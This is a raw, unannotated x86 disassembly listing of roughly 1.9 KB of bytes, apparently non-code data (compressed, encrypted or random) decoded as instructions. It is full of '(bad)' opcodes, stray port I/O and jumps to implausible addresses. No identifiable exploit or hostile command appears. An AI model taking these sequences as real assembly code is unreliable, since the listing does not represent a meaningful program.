  41f574:	ss in  al,dx
  41f576:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f577:	xlat   BYTE PTR ds:[ebx]
  41f578:	out    0x34,al
  41f57a:	pop    ecx
  41f57b:	sbb    dh,dh
  41f57d:	sbb    al,0xab
  41f57f:	jno    0x41f5a1
  41f581:	push   ss
  41f582:	adc    al,0x9
  41f584:	out    0x3c,al
  41f586:	leave  
  41f587:	mov    DWORD PTR [esp+ebp*1],edi
  41f58a:	cld    
  41f58b:	popa   
  41f58c:	jl     0x41f594
  41f58e:	popa   
  41f58f:	pop    edx
  41f590:	jl     0x41f571
  41f592:	gs jnp 0x41f5ec
  41f595:	xchg   esi,eax
  41f596:	jg     0x41f51f
  41f598:	mov    al,ds:0x3b032ec7
  41f59d:	mov    eax,0xd80d444c
  41f5a2:	test   eax,0x967bd88c
  41f5a7:	adc    eax,0x91d7137f
  41f5ac:	aas    
  41f5ad:	cmp    cl,BYTE PTR [ebx-0x3e1a6d4e]
  41f5b3:	xchg   esp,eax
  41f5b4:	mov    dh,BYTE PTR [edi-0x73b09630]
  41f5ba:	mov    al,ds:0xc839ed89
  41f5bf:	aaa    
  41f5c0:	push   ds
  41f5c1:	dec    esp
  41f5c2:	push   esp
  41f5c3:	inc    eax
  41f5c4:	adc    DWORD PTR [ecx+0x1e],eax
  41f5c7:	call   edi
  41f5c9:	lea    edi,[ecx]
  41f5cb:	sub    DWORD PTR [esi],eax
  41f5cd:	add    esp,DWORD PTR [edi-0x35]
  41f5d0:	mov    DWORD PTR [eax],edx
  41f5d2:	xchg   esp,eax
  41f5d3:	(bad)  
  41f5d5:	mov    edx,DWORD PTR [ebx-0x22]
  41f5d8:	sub    al,0x38
  41f5da:	add    BYTE PTR [ebx],0x43
  41f5dd:	sub    al,0xbb
  41f5df:	and    DWORD PTR [ebp+0x66],esi
  41f5e2:	mov    edi,0xfd707ff7
  41f5e7:	jg     0x41f595
  41f5e9:	loope  0x41f592
  41f5eb:	repnz or eax,0x945cb511
  41f5f1:	xor    edi,ebx
  41f5f3:	(bad)  
  41f5f4:	jo     0x41f622
  41f5f6:	jg     0x41f595
  41f5f8:	retf   
  41f5f9:	popf   
  41f5fa:	add    BYTE PTR [edx+0x1a],ch
  41f5fd:	inc    esi
  41f5fe:	ror    edx,1
  41f600:	add    ah,ch
  41f602:	fisubr WORD PTR [ebp-0x6c]
  41f605:	daa    
  41f606:	dec    ebx
  41f607:	js     0x41f65e
  41f609:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f60a:	in     al,dx
  41f60b:	and    eax,0xa2a873a2
  41f610:	adc    eax,0x9fac7553
  41f615:	mov    edx,0x6c1a1cd2
  41f61a:	ss cli 
  41f61c:	and    BYTE PTR [esi],0x37
  41f61f:	repz shl DWORD PTR [edx-0x3bf0500e],0x7a
  41f627:	xlat   BYTE PTR ds:[ebx]
  41f628:	mov    ecx,0x307a9e74
  41f62d:	(bad)  
  41f62e:	push   edi
  41f62f:	int    0xad
  41f631:	rcr    DWORD PTR [edi+0x35d6d112],cl
  41f637:	dec    esi
  41f638:	inc    edx
  41f639:	fisub  WORD PTR [ebp+0x29]
  41f63c:	jmp    0x41f6bc
  41f63e:	mov    cl,0xb9
  41f640:	inc    ebx
  41f641:	sbb    eax,0x878d9cbf
  41f646:	push   ds
  41f647:	cli    
  41f648:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f649:	mov    eax,ds:0x3c65f152
  41f64e:	shl    edx,cl
  41f650:	sahf   
  41f651:	lods   eax,DWORD PTR ds:[esi]
  41f652:	idiv   DWORD PTR [ebx+0x5]
  41f655:	ss aad 0xf6
  41f658:	std    
  41f659:	rcl    DWORD PTR [ebx+0x422f98eb],cl
  41f65f:	(bad)  
  41f660:	inc    BYTE PTR [edi]
  41f662:	mov    ecx,0x50a1413f
  41f667:	inc    esp
  41f668:	mov    edx,0x3d9ec5b8
  41f66d:	test   eax,0xa53490fd
  41f672:	mov    ebp,0x3eb45089
  41f677:	lock es inc ebx
  41f67a:	loopne 0x41f635
  41f67c:	push   ebp
  41f67d:	fnstcw WORD PTR [bx+si]
  41f680:	shl    DWORD PTR [ebx+0x6fe0e8fd],cl
  41f686:	cmp    BYTE PTR [edi+ecx*2],al
  41f689:	mov    eax,ds:0x514d224c
  41f68e:	fld    TBYTE PTR [ecx+0x57d6a24]
  41f694:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f695:	and    dl,BYTE PTR [edi-0x40]
  41f698:	aaa    
  41f699:	sbb    eax,0x53831990
  41f69e:	je     0xa34536b9
  41f6a4:	jns    0x41f649
  41f6a6:	mov    eax,0x1d149746
  41f6ab:	pop    edi
  41f6ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f6ad:	mov    dl,0x4c
  41f6af:	jle    0x41f6e7
  41f6b1:	gs jmp 0x41f67a
  41f6b4:	jg     0x41f6d2
  41f6b6:	jmp    0x41f6a1
  41f6b8:	sti    
  41f6b9:	shl    DWORD PTR [ecx-0x5a],0x65
  41f6bd:	push   cs
  41f6be:	xor    edx,DWORD PTR [edx+0x5a6895e3]
  41f6c4:	pop    esp
  41f6c5:	into   
  41f6c6:	adc    DWORD PTR [ebp+esi*4+0x66],esp
  41f6ca:	bound  edx,QWORD PTR [ebx-0x4]
  41f6cd:	loop   0x41f748
  41f6cf:	cdq    
  41f6d0:	in     eax,0xfb
  41f6d2:	xor    eax,0x3ca675ff
  41f6d7:	pushf  
  41f6d8:	test   ebp,0xe596e1
  41f6de:	ja     0x41f701
  41f6e0:	sbb    bh,BYTE PTR ds:0xf9bfb9f9
  41f6e6:	adc    BYTE PTR [ebx],ch
  41f6e8:	mov    DWORD PTR [eax],edx
  41f6ea:	mov    edi,0xe2068cd7
  41f6ef:	into   
  41f6f0:	scas   eax,DWORD PTR es:[edi]
  41f6f1:	xchg   esp,eax
  41f6f2:	inc    ecx
  41f6f3:	aaa    
  41f6f4:	push   0x2b1494ca
  41f6f9:	lfs    esp,FWORD PTR [edx+edx*4]
  41f6fd:	shl    BYTE PTR [eax-0x29],cl
  41f700:	mov    esi,DWORD PTR [eax+edx*4]
  41f703:	push   0xfffffff9
  41f705:	loop   0x41f6f3
  41f707:	sbb    bl,BYTE PTR [eax+0x4d]
  41f70a:	push   edi
  41f70b:	mov    ah,0x41
  41f70d:	repz cmp dh,BYTE PTR [edi+0x2b3951f1]
  41f714:	lods   al,BYTE PTR ds:[esi]
  41f715:	test   eax,0xe806f889
  41f71a:	addr16 dec ebp
  41f71c:	retf   
  41f71d:	jne    0x41f793
  41f71f:	jle    0x41f79d
  41f721:	and    edx,eax
  41f723:	xlat   BYTE PTR ds:[ebx]
  41f724:	lea    ebx,[esi+ebx*8+0x30]
  41f728:	in     eax,dx
  41f729:	push   esi
  41f72a:	dec    ebp
  41f72b:	pop    ebp
  41f72c:	sar    BYTE PTR [edx-0x72e1f0f6],cl
  41f732:	fwait
  41f733:	or     dl,BYTE PTR [eax-0x24b44162]
  41f739:	fucom  st(5)
  41f73b:	push   esp
  41f73c:	nop
  41f73d:	sub    DWORD PTR [ecx],esp
  41f73f:	xor    esi,DWORD PTR [ebx+ebx*2+0x77998751]
  41f746:	cwde   
  41f747:	pop    ebp
  41f748:	mov    eax,eax
  41f74a:	jl     0x41f7b7
  41f74c:	mov    ds:0xdc6d2164,al
  41f751:	or     DWORD PTR [esi+0x59],ebp
  41f754:	int    0xe6
  41f756:	fistp  QWORD PTR [eax+0x2d]
  41f759:	jl     0x41f729
  41f75b:	mov    eax,0x3e246a0b
  41f760:	mov    eax,ds:0x57cbabfb
  41f765:	fistp  WORD PTR [edx+0x31]
  41f768:	popa   
  41f769:	nop
  41f76a:	or     cl,BYTE PTR ds:0x2a2cbb9d
  41f770:	jno    0x41f7aa
  41f772:	dec    esi
  41f773:	fisttp DWORD PTR [eax+0x7ca7888e]
  41f779:	test   esp,ebp
  41f77b:	xchg   esp,eax
  41f77c:	sub    BYTE PTR [ebx-0x555ae98e],bl
  41f782:	mov    esp,0xa7c8859b
  41f787:	xchg   edi,eax
  41f788:	sti    
  41f789:	xchg   edx,eax
  41f78a:	and    ch,bl
  41f78c:	test   DWORD PTR ds:0xd49531c2,ebx
  41f792:	and    esp,DWORD PTR [ebx+0x12c0af66]
  41f798:	jmp    0x41f7bc
  41f79a:	test   eax,0x67d99eb6
  41f79f:	pop    esi
  41f7a0:	fist   DWORD PTR [edi+0x52cea880]
  41f7a6:	jle    0x41f758
  41f7a8:	add    DWORD PTR [ebx],eax
  41f7aa:	ss int3 
  41f7ac:	in     eax,0xc3
  41f7ae:	xchg   DWORD PTR [ebp+0x3c],edx
  41f7b1:	cmp    eax,ebx
  41f7b3:	ja     0x41f77b
  41f7b5:	sbb    al,0xef
  41f7b7:	jecxz  0x41f837
  41f7b9:	cmc    
  41f7ba:	xchg   edx,eax
  41f7bb:	jge    0x41f7d8
  41f7bd:	gs fcmovnb st,st(7)
  41f7c0:	or     eax,0x509a9f75
  41f7c5:	xor    DWORD PTR [eax],ebp
  41f7c7:	or     esi,esp
  41f7c9:	test   al,0xd4
  41f7cb:	shl    BYTE PTR [edi+0x29],0xce
  41f7cf:	mov    ds:0xbe80a84c,eax
  41f7d4:	pop    DWORD PTR [eax+esi*8-0x2e]
  41f7d8:	and    BYTE PTR [esi],dh
  41f7da:	arpl   WORD PTR [edx+0x523cdf4b],di
  41f7e0:	and    bl,dh
  41f7e2:	inc    edx
  41f7e3:	xor    al,0x1b
  41f7e5:	mov    bl,0xd0
  41f7e7:	mov    ebp,0x3b77eb75
  41f7ec:	in     al,0x59
  41f7ee:	sub    DWORD PTR [eax+0x5],ebp
  41f7f1:	ss or  al,0x4b
  41f7f4:	push   ebx
  41f7f5:	(bad)  
  41f7f7:	les    esp,FWORD PTR [ebx-0x4d]
  41f7fa:	loop   0x41f7a1
  41f7fc:	aad    0xa5
  41f7fe:	mov    dh,0xb5
  41f800:	call   0x122a:0x3559854d
  41f807:	cld    
  41f808:	cs stos BYTE PTR es:[di],al
  41f80b:	dec    ebx
  41f80c:	lahf   
  41f80d:	sub    esp,DWORD PTR [edx]
  41f80f:	jp     0x41f802
  41f811:	add    bh,BYTE PTR [esi+0x5109b111]
  41f817:	or     al,0x2e
  41f819:	adc    ebx,esi
  41f81b:	xchg   edx,eax
  41f81c:	mov    eax,ds:0x4386639a
  41f821:	xchg   BYTE PTR [edx+0x59],dl
  41f824:	retf   
  41f825:	cmp    al,0x2b
  41f827:	jecxz  0x41f895
  41f829:	lea    esi,[ebx+0x5e98d5e2]
  41f82f:	cmp    eax,0x83ba96d2
  41f834:	xchg   edi,eax
  41f835:	and    cl,BYTE PTR [eax]
  41f837:	scas   eax,DWORD PTR es:[edi]
  41f838:	cmp    bl,BYTE PTR [ebx+0x5db88635]
  41f83e:	aad    0xf3
  41f840:	jl     0x41f877
  41f842:	xor    al,0xcf
  41f844:	ror    BYTE PTR [esi+0x1b],cl
  41f847:	nop
  41f848:	jnp    0x41f894
  41f84a:	or     edx,edi
  41f84c:	mov    ebx,0xb3e4cd72
  41f851:	es aam 0x4
  41f854:	xchg   esp,eax
  41f855:	scas   eax,DWORD PTR es:[edi]
  41f856:	jb     0x41f823
  41f858:	in     eax,0xc9
  41f85a:	lods   al,BYTE PTR ds:[esi]
  41f85b:	imul   edi,DWORD PTR [ecx+0x4ba2a082],0x297eab60
  41f865:	add    eax,0x7df6c0d6
  41f86a:	aas    
  41f86b:	hlt    
  41f86c:	cmp    DWORD PTR [bp+0x2c],0x6eaed64c
  41f874:	sub    eax,0x5c0230eb
  41f879:	call   0xe8d9d6fc
  41f87e:	mov    WORD PTR ds:0xff088d0,ss
  41f884:	rol    DWORD PTR [ebx+0x16f58f9c],1
  41f88a:	cmc    
  41f88b:	xor    al,0x13
  41f88d:	loope  0x41f889
  41f88f:	cmp    DWORD PTR [esi-0x7],0x43ec5d7c
  41f896:	je     0x41f8da
  41f898:	fsub   QWORD PTR [eax]
  41f89a:	ins    BYTE PTR es:[edi],dx
  41f89b:	mov    edi,0x7af5175e
  41f8a0:	mov    dh,0xf3
  41f8a2:	xor    BYTE PTR ds:0x12cb53fb,ch
  41f8a8:	pop    ebp
  41f8a9:	std    
  41f8aa:	test   BYTE PTR [edi],0xb3
  41f8ad:	leave  
  41f8ae:	or     eax,0xb4a4511a
  41f8b3:	and    bh,BYTE PTR [edi+0x34]
  41f8b6:	push   cs
  41f8b7:	mov    ecx,0x8e6f7611
  41f8bc:	sahf   
  41f8bd:	(bad)  
  41f8be:	rcl    DWORD PTR [edi+0x6acd408f],cl
  41f8c4:	rcl    DWORD PTR [ecx],1
  41f8c6:	les    ecx,FWORD PTR [ebx+0x23]
  41f8c9:	mov    bh,0x1
  41f8cb:	cmp    BYTE PTR [esi+0x48fee0f4],bh
  41f8d1:	in     eax,0xbf
  41f8d3:	pop    esi
  41f8d4:	pop    es
  41f8d5:	mov    BYTE PTR [ecx],al
  41f8d7:	pop    ss
  41f8d8:	jb     0x41f8c0
  41f8da:	(bad)  
  41f8db:	cmp    BYTE PTR [ebp-0x74ecea27],ah
  41f8e1:	xchg   DWORD PTR [ebp-0x295338b5],ebp
  41f8e7:	fld    QWORD PTR [edx+0x38]
  41f8ea:	sub    ebp,eax
  41f8ec:	in     eax,0xfc
  41f8ee:	ja     0x41f8ce
  41f8f0:	mov    ebx,0xa7f86dce
  41f8f5:	aaa    
  41f8f6:	les    ecx,FWORD PTR [edx+0x52]
  41f8f9:	mov    cl,0x79
  41f8fb:	cmp    al,0xa8
  41f8fd:	push   ebp
  41f8fe:	lahf   
  41f8ff:	ins    DWORD PTR es:[edi],dx
  41f900:	jmp    0x530ae605
  41f905:	push   esi
  41f906:	arpl   bp,bp
  41f908:	inc    eax
  41f909:	aam    0x5d
  41f90b:	das    
  41f90c:	and    dh,bh
  41f90e:	xchg   ecx,eax
  41f90f:	push   ecx
  41f910:	dec    eax
  41f911:	jecxz  0x41f913
  41f913:	ror    BYTE PTR [esi-0x6c],0xfb
  41f917:	pop    esp
  41f918:	inc    ebx
  41f919:	cli    
  41f91a:	adc    cl,dh
  41f91c:	pop    edi
  41f91d:	popf   
  41f91e:	imul   ebx,DWORD PTR [ebx+0x5],0xf
  41f922:	imul   si,sp,0x26
  41f926:	(bad)  
  41f927:	test   al,0xed
  41f929:	jp     0x41f96a
  41f92b:	pop    edi
  41f92c:	test   eax,ecx
  41f92e:	mov    eax,0xdb0f4212
  41f933:	xor    al,0x65
  41f935:	push   0x5b
  41f937:	pop    edx
  41f938:	cmp    al,0x94
  41f93a:	xor    eax,0xcc3253f8
  41f93f:	pop    edx
  41f940:	xchg   DWORD PTR [edx+0x68],eax
  41f943:	or     DWORD PTR [edx+eiz*8-0x53],ecx
  41f947:	xor    eax,0x522121a4
  41f94c:	test   BYTE PTR [ebx+eax*4-0x72],cl
  41f950:	pop    eax
  41f951:	test   BYTE PTR [edx-0x7457770e],ch
  41f957:	out    0x44,eax
  41f959:	out    dx,al
  41f95a:	pop    ebp
  41f95b:	and    al,0x5
  41f95d:	pop    edi
  41f95e:	dec    edi
  41f95f:	cmp    DWORD PTR [ebx],0x7
  41f962:	jl     0x41f8fb
  41f964:	mov    dh,0x9a
  41f966:	jnp    0x41f946
  41f968:	mov    eax,0xc401f4e4
  41f96d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f96e:	inc    ebp
  41f96f:	repnz lods al,BYTE PTR ds:[esi]
  41f971:	xor    eax,0xe85333f0
  41f976:	dec    ebp
  41f977:	sahf   
  41f978:	mov    dl,0x30
  41f97a:	pushf  
  41f97b:	mov    dh,bh
  41f97d:	js     0x41f9a6
  41f97f:	sar    DWORD PTR [ebx-0x80],1
  41f982:	icebp  
  41f983:	push   ecx
  41f984:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f985:	add    eax,eax
  41f987:	sub    al,0x3
  41f989:	and    edx,ebp
  41f98b:	dec    esp
  41f98c:	xchg   DWORD PTR cs:[ecx+0x2c339338],eax
  41f993:	adc    BYTE PTR [eax],dl
  41f995:	sti    
  41f996:	in     eax,0x5d
  41f998:	xchg   edi,eax
  41f999:	xor    dl,BYTE PTR [esi-0x62ea3b5d]
  41f99f:	inc    edi
  41f9a0:	jnp    0x41f98f
  41f9a2:	retf   
  41f9a3:	dec    esp
  41f9a4:	int    0x63
  41f9a6:	aas    
  41f9a7:	fst    QWORD PTR [edx+ebp*1]
  41f9aa:	cld    
  41f9ab:	mov    ds:0xe7e80ac7,al
  41f9b0:	cdq    
  41f9b1:	and    ah,BYTE PTR [ebx+0x51]
  41f9b4:	into   
  41f9b5:	or     esp,DWORD PTR ds:0xad1cbb47
  41f9bb:	pslld  xmm2,XMMWORD PTR [eax-0x47a3f45c]
  41f9c3:	dec    esi
  41f9c4:	aad    0xa9
  41f9c6:	or     bh,bh
  41f9c8:	add    edi,DWORD PTR [edx+0x23999d5e]
  41f9ce:	pop    esp
  41f9cf:	inc    eax
  41f9d0:	xor    ah,al
  41f9d2:	dec    eax
  41f9d3:	mov    edx,0x20f526a6
  41f9d8:	jns    0x41f9ae
  41f9da:	and    eax,0xa84745e0
  41f9df:	das    
  41f9e0:	add    dl,BYTE PTR [ebp+0x43]
  41f9e3:	and    ebp,ebp
  41f9e5:	and    DWORD PTR [ebp-0x17],edi
  41f9e8:	xchg   DWORD PTR [eax+0x53],edi
  41f9eb:	or     esi,DWORD PTR [esi]
  41f9ed:	inc    ecx
  41f9ee:	mov    edi,DWORD PTR [esi+0x119f99e6]
  41f9f4:	imul   ecx,ebx,0x10
  41f9f7:	mov    edi,0x9106150a
  41f9fc:	mov    eax,esi
  41f9fe:	pop    es
  41f9ff:	mov    al,0x92
  41fa01:	std    
  41fa02:	ss jmp 0x7d0e43af
  41fa08:	inc    edx
  41fa09:	rcr    DWORD PTR [edx+0xd],0x87
  41fa0d:	fst    QWORD PTR [edi+eiz*2+0x1f67a83b]
  41fa14:	pop    esi
  41fa15:	mov    ch,0xf6
  41fa17:	outs   dx,BYTE PTR ds:[esi]
  41fa18:	out    0x5b,al
  41fa1a:	ds aad 0x67
  41fa1d:	stos   DWORD PTR es:[edi],eax
  41fa1e:	or     ebp,DWORD PTR ds:0x9d74710f
  41fa24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa25:	push   eax
  41fa26:	aam    0xc
  41fa28:	xchg   ebp,eax
  41fa29:	jnp    0x41fa4d
  41fa2b:	xchg   ebp,eax
  41fa2c:	push   edx
  41fa2d:	sbb    ecx,DWORD PTR [ecx+0x1f6ed2e8]
  41fa33:	pop    esp
  41fa34:	or     ebx,DWORD PTR [esi+esi*2-0xdcc458d]
  41fa3b:	hlt    
  41fa3c:	mov    ds:0x6800328f,eax
  41fa41:	rcr    BYTE PTR es:[esi-0xc83646f],cl
  41fa48:	mov    bl,0xb5
  41fa4a:	xchg   edx,eax
  41fa4b:	inc    ecx
  41fa4c:	sub    al,0xf8
  41fa4e:	mov    bl,0xf6
  41fa50:	pop    edi
  41fa51:	jo     0x41fa81
  41fa53:	out    0x29,al
  41fa55:	int    0xb1
  41fa57:	(bad)  [edx-0x79]
  41fa5a:	mov    esp,0xb5e7e1ae
  41fa5f:	test   DWORD PTR [ebp+0x4ce8d9c5],ebp
  41fa65:	aad    0x7f
  41fa67:	jne    0x41fadd
  41fa69:	ret    0x31ec
  41fa6c:	jecxz  0x41fac8
  41fa6e:	fistp  DWORD PTR [edx]
  41fa70:	repnz xor eax,0xd1efeba9
  41fa76:	xor    bh,dl
  41fa78:	int3   
  41fa79:	jb     0x41fa11
  41fa7b:	sub    BYTE PTR [ebx+0x16],cl
  41fa7e:	sub    dh,BYTE PTR [edx]
  41fa80:	inc    edx
  41fa81:	pop    es
  41fa82:	or     eax,0xacabca55
  41fa87:	push   edx
  41fa88:	mov    esi,ebx
  41fa8a:	mov    WORD PTR [edx-0xa],gs
  41fa8d:	shl    BYTE PTR [ebp-0x7d],1
  41fa90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa91:	imul   edx,DWORD PTR [ecx-0x73],0xffffffda
  41fa95:	(bad)  
  41fa97:	mov    eax,0xc2108bbd
  41fa9c:	push   edi
  41fa9d:	mov    esi,0xae757370
  41faa2:	aam    0x5c
  41faa4:	mov    DWORD PTR [eax+0x4bfff903],ebx
  41faaa:	iret   
  41faab:	adc    BYTE PTR [eax],0xd4
  41faae:	xor    edi,DWORD PTR [edi]
  41fab0:	adc    bh,BYTE PTR ds:[ebx-0x19]
  41fab4:	daa    
  41fab5:	adc    BYTE PTR [edx],cl
  41fab7:	out    dx,al
  41fab8:	imul   edi,DWORD PTR [edx],0x36bbfe66
  41fabe:	mov    bh,0xa6
  41fac0:	arpl   WORD PTR [esi],si
  41fac2:	jb     0x41fa9c
  41fac4:	jmp    0xc66a:0xd4cef98c
  41facb:	add    ah,BYTE PTR [esi]
  41facd:	(bad)  
  41face:	(bad)  
  41facf:	mov    dh,0xc
  41fad1:	add    ecx,edi
  41fad3:	lods   al,BYTE PTR ds:[esi]
  41fad4:	xchg   esi,eax
  41fad5:	in     eax,dx
  41fad6:	pusha  
  41fad7:	in     eax,dx
  41fad8:	and    dh,BYTE PTR [ecx+0x73c5afa4]
  41fade:	loop   0x41fac7
  41fae0:	jecxz  0x41fae4
  41fae2:	retf   0x51bb
  41fae5:	push   0xee9f14c0
  41faea:	aaa    
  41faeb:	push   edx
  41faec:	xor    dh,BYTE PTR [edx-0x73]
  41faef:	call   ebx
  41faf1:	int    0xc
  41faf3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41faf4:	les    ecx,FWORD PTR [eax-0x42]
  41faf7:	addr16 sbb cl,ch
  41fafa:	and    al,0xe1
  41fafc:	xor    dh,bl
  41fafe:	imul   edi,DWORD PTR [eax-0x68f347fc],0x75
  41fb05:	push   esp
  41fb06:	or     al,0xdc
  41fb08:	icebp  
  41fb09:	stos   BYTE PTR es:[edi],al
  41fb0a:	inc    eax
  41fb0b:	fild   DWORD PTR [eax]
  41fb0d:	push   ds
  41fb0e:	mov    bl,0x90
  41fb10:	mov    dl,0xba
  41fb12:	and    DWORD PTR [edx+0x364ae38f],0xf55d0418
  41fb1c:	xor    eax,ecx
  41fb1e:	push   esi
  41fb1f:	and    al,ah
  41fb21:	push   ds
  41fb22:	shl    DWORD PTR [eax],cl
  41fb24:	sub    cl,BYTE PTR [ebx+0x56]
  41fb27:	out    0x8,eax
  41fb29:	in     al,dx
  41fb2a:	mov    eax,ds:0xe730490d
  41fb2f:	dec    edx
  41fb30:	xor    BYTE PTR [ecx+edx*4+0x148f2815],dh
  41fb37:	fs ret 0x7da
  41fb3b:	lock psubsb mm5,QWORD PTR [ebx-0x71]
  41fb40:	rcr    DWORD PTR [eax-0x2c810b47],0x1e
  41fb47:	out    dx,eax
  41fb48:	ret    0x3afa
  41fb4b:	jl     0x41fad2
  41fb4d:	pop    ecx
  41fb4e:	(bad)  
  41fb4f:	stc    
  41fb50:	and    ecx,ebx
  41fb52:	aaa    
  41fb53:	(bad)  
  41fb54:	push   ebp
  41fb55:	pop    edi
  41fb56:	ins    BYTE PTR es:[edi],dx
  41fb57:	sub    al,0x8b
  41fb59:	ja     0x41fbc6
  41fb5b:	stos   DWORD PTR es:[edi],eax
  41fb5c:	cmp    BYTE PTR [eax],dh
  41fb5e:	sub    al,0x21
  41fb60:	push   edi
  41fb61:	gs sbb esp,ecx
  41fb64:	xor    BYTE PTR [ebx+0x1ae0b39f],0xc9
  41fb6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb6c:	push   0xd5f92712
  41fb71:	icebp  
  41fb72:	int3   
  41fb73:	cmp    DWORD PTR [esi],edx
  41fb75:	outs   dx,DWORD PTR ds:[esi]
  41fb76:	jge    0x41fb23
  41fb78:	mov    bh,0x10
  41fb7a:	xor    eax,0x5da885ae
  41fb7f:	aad    0xc
  41fb81:	out    dx,eax
  41fb82:	fdivr  QWORD PTR [edi]
  41fb84:	sbb    BYTE PTR [ebp+0x4b2bb764],dl
  41fb8a:	mov    ds:0x77f22e2e,eax
  41fb8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fb90:	xor    ah,bh
  41fb92:	push   0x5655415c
  41fb97:	dec    edi
  41fb98:	push   ebp
  41fb99:	pop    ds
  41fb9a:	outs   dx,DWORD PTR ds:[esi]
  41fb9b:	lahf   
  41fb9c:	rcl    BYTE PTR [esi+0x48],cl
  41fb9f:	cmp    esp,ebp
  41fba1:	mov    bl,0xd2
  41fba3:	mov    eax,ds:0xba3addee
  41fba8:	sub    esi,DWORD PTR [eax]
  41fbaa:	and    DWORD PTR [ecx+0x72f255d1],ecx
  41fbb0:	adc    ch,0xe2
  41fbb3:	out    0x15,al
  41fbb5:	je     0x41fb74
  41fbb7:	or     edx,DWORD PTR ds:0x17813e0d
  41fbbd:	dec    esp
  41fbbe:	push   es
  41fbbf:	fmul   QWORD PTR [ecx]
  41fbc1:	xor    eax,DWORD PTR [ebp-0x2c]
  41fbc4:	jo     0x41fbaf
  41fbc6:	imul   ecx,edx,0xffffffd8
  41fbc9:	mov    dh,BYTE PTR [ebx+edx*4-0xd]
  41fbcd:	sbb    ch,dh
  41fbcf:	scas   al,BYTE PTR es:[edi]
  41fbd0:	adc    DWORD PTR [ebx-0x5ca577bf],ecx
  41fbd6:	xchg   esp,eax
  41fbd7:	(bad)  [esi-0x1b]
  41fbda:	jp     0x41fc44
  41fbdc:	adc    dh,BYTE PTR [esi+esi*2-0x4d]
  41fbe0:	dec    DWORD PTR [edx]
  41fbe2:	sub    BYTE PTR ds:0x2fbab8c4,dh
  41fbe8:	(bad)  
  41fbe9:	cmp    eax,0x6e35d01b
  41fbee:	aaa    
  41fbef:	push   ss
  41fbf0:	push   ecx
  41fbf1:	in     al,dx
  41fbf2:	jmp    FWORD PTR [esp+ebx*1+0x128926a2]
  41fbf9:	push   cs
  41fbfa:	xchg   ebx,eax
  41fbfb:	mov    ds:0x17abe91,al
  41fc00:	push   ss
  41fc01:	fsubr  st,st(0)
  41fc03:	fstp   TBYTE PTR [ebx+ecx*2]
  41fc06:	xor    eax,0xd99e8db5
  41fc0b:	and    DWORD PTR [ebp-0x69],0xffffffa8
  41fc0f:	cmp    edx,DWORD PTR fs:[edx-0x6936463e]
  41fc16:	push   esp
  41fc17:	push   ebp
  41fc18:	cmp    BYTE PTR [ebp-0xdf323ea],bl
  41fc1e:	ret    0xf270
  41fc21:	retf   0x469d
  41fc24:	frstor [eax-0x59]
  41fc27:	fld    DWORD PTR [edi-0x43c847f2]
  41fc2d:	jns    0x41fc2e
  41fc2f:	cmp    al,0x17
  41fc31:	sub    BYTE PTR [bx+si-0x4d10],bh
  41fc36:	jge    0x41fbf1
  41fc38:	shl    bl,0xaf
  41fc3b:	adc    DWORD PTR [eax],ecx
  41fc3d:	addr16 fucom st(1)
  41fc40:	push   edi
  41fc41:	pop    esi
  41fc42:	iret   
  41fc43:	out    dx,al
  41fc44:	ds sub eax,0x3630f810
  41fc4a:	jno    0x41fca0
  41fc4c:	mov    al,0x3f
  41fc4e:	fld    st(1)
  41fc51:	add    ecx,edx
  41fc53:	dec    esi
  41fc54:	cmp    ebx,DWORD PTR [edi-0x10f92e6d]
  41fc5a:	pusha  
  41fc5b:	add    BYTE PTR [ebx],0xb1
  41fc5e:	and    al,0xaa
  41fc60:	xor    BYTE PTR [edi+0x14],dl
  41fc63:	inc    edx
  41fc64:	and    cl,dl
  41fc66:	add    ebx,esp
  41fc68:	adc    ebp,DWORD PTR [ecx+esi*4-0x7cbdcd4a]
  41fc6f:	imul   esp
  41fc71:	ror    BYTE PTR [edx+0x6e],0x9d
  41fc75:	mov    edx,0xc2a537e1
  41fc7a:	jne    0x41fca4
  41fc7c:	in     al,dx
  41fc7d:	jnp    0x41fc68
  41fc7f:	push   edx
  41fc80:	les    eax,FWORD PTR [ebp+0x17]
  41fc83:	add    ah,BYTE PTR [esi+0x9ef0ffb]
  41fc89:	add    dl,BYTE PTR [eax+0x1f]
  41fc8c:	sub    al,0xe4
  41fc8e:	push   0xfffffffb
  41fc90:	imul   eax,DWORD PTR [edi+eax*8],0xf438d545
  41fc97:	sub    eax,0x94641ccc
  41fc9c:	js     0x41fc21
  41fc9e:	pop    eax
  41fc9f:	or     ah,ah
  41fca1:	pop    ss
  41fca2:	scas   al,BYTE PTR es:[edi]
  41fca3:	mov    esi,0x5b62782a
  41fca8:	fistp  DWORD PTR [ecx+0x3d]
  41fcab:	xchg   edx,eax
  41fcac:	pop    ebx
  41fcad:	jno    0x41fca2
  41fcaf:	xchg   esi,eax
  41fcb0:	xchg   DWORD PTR [eax],esp
  41fcb2:	or     eax,0xde7c52dd
  41fcb7:	(bad)  
  41fcb8:	loopne 0x41fcab
  41fcba:	and    dh,bl
  41fcbc:	leave  
  41fcbd:	jl     0x41fcb4
  41fcbf:	clc    
  41fcc0:	and    eax,0xee836483
  41fcc5:	ret    0x179d
  41fcc8:	cmp    ecx,ebx
  41fcca:	adc    dh,ah
  41fccc:	daa    
  41fccd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fcce:	mov    dh,0x35
  41fcd0:	stos   BYTE PTR es:[edi],al
  41fcd1:	sbb    ah,BYTE PTR [ecx+edi*1]
  41fcd4:	xor    dh,dl
  41fcd6:	jnp    0x41fd55
  41fcd8:	loop   0x41fd35
  41fcda:	mov    BYTE PTR [ebx-0x3bc062f4],al
  41fce0:	int    0x6d
  41fce2:	shl    DWORD PTR [edi+edx*1-0x279da464],cl
  41fce9:	sub    edx,edx
  41fceb:	or     eax,0x4d370110
